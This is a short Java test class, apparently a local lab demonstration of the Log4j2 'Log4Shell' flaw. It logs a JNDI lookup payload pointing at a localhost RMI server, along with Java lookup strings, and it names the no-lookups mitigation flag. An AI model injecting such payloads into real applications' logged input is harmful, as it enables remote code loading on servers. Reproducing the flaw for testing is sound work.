package com.qcl.log4j.test;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * client端
 * 启动参数：-Dlog4j2.formatMsgNoLookups=true
 *
 * @author legend
 * @version 1.0
 * @description
 * @date 2021/12/16
 */
public class Log4j2Test {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger();
        System.out.println("Log4j2Test");
        String msg2 = "${jndi:rmi://127.0.0.1:1099/Test}";
        String username = "${java:vm}";
        String username2 = "${java:os}";
        logger.error("username：{},username2：{}", username, username2);
        //执行后发现 Eval 被加载了
        logger.error("Hello here{}", msg2);
    }
}